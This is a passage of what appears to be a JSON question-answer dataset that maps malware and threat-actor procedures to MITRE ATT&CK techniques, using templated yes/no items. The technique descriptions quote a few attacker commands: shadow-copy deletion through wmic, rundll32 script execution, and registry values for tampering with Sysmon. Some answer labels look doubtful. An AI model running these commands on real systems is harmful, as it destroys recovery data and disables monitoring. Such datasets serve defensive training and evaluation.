    "instruction": "Q: Is procedure NanHaiShu can change Internet Explorer settings to reduce warnings about malware activity. a type of technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Impair Defenses: Disable or Modify Tools: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
      "question": "Is procedure NanHaiShu can change Internet Explorer settings to reduce warnings about malware activity. a type of technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Encrypted Channel: Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files..\nAnswer in Yes or No.\n\nQuestion: Is procedure RCSession can use an encrypted beacon to check in with C2.  related to technique Encrypted Channel",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Encrypted Channel: Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
      "question": "Is procedure RCSession can use an encrypted beacon to check in with C2.  related to technique Encrypted Channel",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Windows Management Instrumentation: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc..\nAnswer in Yes or No.\n\nQuestion: Is procedure During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. a type of technique Command and Scripting Interpreter",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Windows Management Instrumentation: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
      "question": "Is procedure During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. a type of technique Command and Scripting Interpreter",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel..\nQ: Is procedure httpclient opens cmd.exe on the victim. a type of technique Data Obfuscation: Steganography.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure httpclient opens cmd.exe on the victim. a type of technique Data Obfuscation: Steganography",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure KGH_SPY has masqueraded as a legitimate Windows tool.  related to technique Masquerading: Match Legitimate Name or Location.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Masquerading: Match Legitimate Name or Location: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "question": "Is procedure KGH_SPY has masqueraded as a legitimate Windows tool.  related to technique Masquerading: Match Legitimate Name or Location",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Derusbi is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.  related to technique Phishing: Spearphishing Link",
    "context": "",
    "output": "No.\nThe provided context is correlated with Indicator Removal: File Deletion",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure Derusbi is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.  related to technique Phishing: Spearphishing Link",
      "yes/no": "No.\nThe provided context is correlated with Indicator Removal: File Deletion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure HermeticWizard can use a list of hardcoded credentials in attempt to authenticate to SMB shares.  related to technique Ingress Tool Transfer.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Brute Force: Password Guessing: Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "question": "Is procedure HermeticWizard can use a list of hardcoded credentials in attempt to authenticate to SMB shares.  related to technique Ingress Tool Transfer",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background User Execution: Malicious File: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing..\nQ: Is procedure FIN6 has used malicious documents to lure victims into allowing execution of PowerShell scripts. a type of technique User Execution: Malicious File.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "User Execution: Malicious File: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "question": "Is procedure FIN6 has used malicious documents to lure victims into allowing execution of PowerShell scripts. a type of technique User Execution: Malicious File",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications..\nAnswer in Yes or No.\n\nQuestion: Is procedure Aria-body has used TCP in C2 communications. a type of technique Non-Application Layer Protocol",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "question": "Is procedure Aria-body has used TCP in C2 communications. a type of technique Non-Application Layer Protocol",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure SLOTHFULMEDIA has the capability to enumerate services. a type of technique Subvert Trust Controls: Code Signing.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is System Service Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Service Discovery: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "question": "Is procedure SLOTHFULMEDIA has the capability to enumerate services. a type of technique Subvert Trust Controls: Code Signing",
      "yes/no": "No.\nThe correct answer is System Service Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Process Injection: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel..\nQ: Is procedure HOPLIGHT has injected into running processes.  related to technique Process Injection.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Process Injection: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
      "question": "Is procedure HOPLIGHT has injected into running processes.  related to technique Process Injection",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure EKANS uses standard encryption library functions to encrypt files.  related to technique Proxy: Internal Proxy",
    "context": "",
    "output": "No.\nThe provided context is correlated with Data Encrypted for Impact",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Encrypted for Impact: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "question": "Is procedure EKANS uses standard encryption library functions to encrypt files.  related to technique Proxy: Internal Proxy",
      "yes/no": "No.\nThe provided context is correlated with Data Encrypted for Impact",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure ToddyCat has used Powershell scripts to perform post exploit collection.  related to technique System Services: Service Execution.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Command and Scripting Interpreter: PowerShell",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: PowerShell: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "question": "Is procedure ToddyCat has used Powershell scripts to perform post exploit collection.  related to technique System Services: Service Execution",
      "yes/no": "No.\nThe correct answer is Command and Scripting Interpreter: PowerShell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Data from Local System: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system..\nQ: Is procedure Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors.  related to technique Data from Local System.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data from Local System: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "question": "Is procedure Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors.  related to technique Data from Local System",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Ninja loader components can be executed through rundll32.exe.  related to technique System Binary Proxy Execution: Rundll32.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Binary Proxy Execution: Rundll32: Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
      "question": "Is procedure Ninja loader components can be executed through rundll32.exe.  related to technique System Binary Proxy Execution: Rundll32",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure BLINDINGCAN has modified file and directory timestamps. a type of technique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
    "context": "",
    "output": "No.\nThe provided context is correlated with Indicator Removal: Timestomp",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: Timestomp: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
      "question": "Is procedure BLINDINGCAN has modified file and directory timestamps. a type of technique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
      "yes/no": "No.\nThe provided context is correlated with Indicator Removal: Timestomp",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Obfuscated Files or Information: Binary Padding: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed..\nAnswer in Yes or No.\n\nQuestion: Is procedure Snip3 can obfuscate strings using junk Chinese characters.  related to technique Obfuscated Files or Information: Binary Padding",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Binary Padding: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.",
      "question": "Is procedure Snip3 can obfuscate strings using junk Chinese characters.  related to technique Obfuscated Files or Information: Binary Padding",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Input Capture: Credential API Hooking: Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow..\nAnswer in Yes or No.\n\nQuestion: Is procedure ZxShell hooks several API functions to spawn system threads.  related to technique Scheduled Task/Job: Scheduled Task",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Input Capture: Credential API Hooking: Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",
      "question": "Is procedure ZxShell hooks several API functions to spawn system threads.  related to technique Scheduled Task/Job: Scheduled Task",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Lizar has a plugin to retrieve information about all active network sessions on the infected server.  related to technique System Network Connections Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Connections Discovery: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).",
      "question": "Is procedure Lizar has a plugin to retrieve information about all active network sessions on the infected server.  related to technique System Network Connections Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
